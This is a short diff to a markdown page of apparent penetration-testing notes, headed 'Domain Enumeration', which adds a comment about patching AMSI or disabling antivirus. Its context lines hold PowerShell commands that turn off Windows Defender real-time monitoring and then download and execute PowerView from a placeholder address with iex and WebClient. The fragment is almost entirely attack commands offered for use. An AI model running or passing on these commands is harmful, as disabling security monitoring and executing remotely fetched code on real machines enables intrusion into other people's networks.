@@ -12,6 +12,8 @@ permalink: /brainbox/
 
 ### DOMAIN ENUMERATION
  # Patch AMSI or disable AV
+<span style="color: Green;"># Patch AMSI or disable AV</span>
+
 ```powershell
       Set-MpPreference -DisableRealTimeMonitoring -DisableAVIOProtection $true
       iex(New-Object System.Net.WebClient).downloadString('http:/x.x.x.x./PowerView_DeV.ps1')
